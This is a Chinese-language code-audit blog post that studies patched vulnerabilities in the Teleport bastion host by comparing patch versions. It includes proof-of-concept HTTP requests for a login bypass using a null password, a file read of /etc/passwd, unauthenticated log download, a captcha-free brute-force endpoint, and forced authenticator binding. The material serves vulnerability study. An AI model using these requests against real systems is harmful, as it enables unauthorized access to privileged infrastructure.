---
title: "teleport堡垒机审计学习"
date: 2022-09-16T12:00:00+08:00
draft: false
author: "r0fus0d & kitezzzGrim"

---

代码审计做的比较少，看到大佬发的分析文章，正好学习下
- https://www.o2oxy.cn/4132.html

<!--more-->

---

访问下载页面 https://tp4a.com/download

更新公告里说明了几个漏洞情况

![](../../img/teleport_case/1.png)

下载 补丁包和原版包，进行对比

## 任意用户登录

![](../../img/teleport_case/2.png)

补丁里对几种登录类型进行了验证，不允许 password 值为 null

可以看下验证登录的函数 login,在 data/www/teleport/webroot/app/model/user.py

![](../../img/teleport_case/7.png)

在 password 为null 的时候就跳过了验证

poc
```
抓包，把密码改为 null 即可
      {
          "type":2,
          "username":"admin",
          "password":null,
          "captcha":"rhcl",
          "oath":"",
          "remember":false
      }
```

顺便可以看下在 tp-const.js 里的几种登录类型的定义

![](../../img/teleport_case/6.png)

这里 type 为 2 就是 TP_LOGIN_AUTH_USERNAME_PASSWORD_CAPTCHA 也就是 用户名+密码+验证码 类型

---

## 后台文件下载

![](../../img/teleport_case/3.png)

修复补丁给 DoGetFileHandler 函数加上了一个限制，仅允许读取

找下路由

![](../../img/teleport_case/8.png)

验证了权限，所以是后台洞

![](../../img/teleport_case/9.png)

poc
```
/audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&amp;offset=0
```

---

## 前台日志下载

这时我发现升级描述里还有一句 `修正：经过特别构造的请求，无需登录即可读取TP系统操作日志；` ,这个洞应该也是未授权的.

下载 teleport-server-linux-x64-3.6.4-b3.tar.gz 和 3.6.3 对比下

![](../../img/teleport_case/4.png)

果然，补丁给 DoGetLogsHandler 这个函数加上了权限验证,看下他的路由

![](../../img/teleport_case/5.png)

poc
```
    POST http://xxx.xxx.xxx.xxx/system/get-logs HTTP/1.1
    Host: xxx.xxx.xxx.xxx
    Content-Length: 162
    Content-Type: application/x-www-form-urlencoded;
    Connection: close

    args=%7B%22filter%22%3A%7B%7D%2C%22order%22%3A%7B%22k%22%3A%22log_time%22%2C%22v%22%3Afalse%7D%2C%22limit%22%3A%7B%22page_index%22%3A0%2C%22per_page%22%3A25%7D%7D
```

---

## 绕过验证码爆破

继续看路由，发现BindOathHandler这个函数也不需要鉴权，这个路由下还存在登陆点且无需验证码

poc
```
/user/bind-oath
```

```
POST /user/verify-user HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 102
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _sid=tp_1663328293_17c56ddafdb179f0
Connection: close

args=%7B%22username%22%3A%22admin%22%2C%22password%22%3A%22123456%22%2C%22check_bind_oath%22%3Atrue%7D
```

不过注意,默认口令启用强密码策略，要求密码至少8位，必须包含大写字母、小写字母以及数字

---

## 强行绑定身份验证器

同样是BindOathHandler这个函数,看了下他返回user/bind-oath.mako的模版，模版里向/user/verify-user 发送认证请求，通过路由定位到函数DoVerifyUserHandler

![](../../img/teleport_case/10.png)

可以看到，这里也是用 user.login 函数认证的，所以 password 直接用 null 就可以绕过了

poc
```
POST http://xx.xx.xx.xx/user/verify-user HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 94
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _sid=tp_1663328293_17c56ddafdb179f0
Connection: close

args=%7B%22username%22%3A%22admin%22%2C%22password%22%3Anull%2C%22check_bind_oath%22%3Atrue%7D
```

![](../../img/teleport_case/11.png)

同样，下一个包也设为 null 即可

这洞没啥用，可以用于恶心管理员 😝

---

## 一些思考

1. 根据这个权限验证代码的存在与否可以找前台未授权的点，那么能不能实现自动找未授权页面？
2. 几个权限绕过本质上是 login 函数的问题，可以根据login函数调用点找漏洞触发点
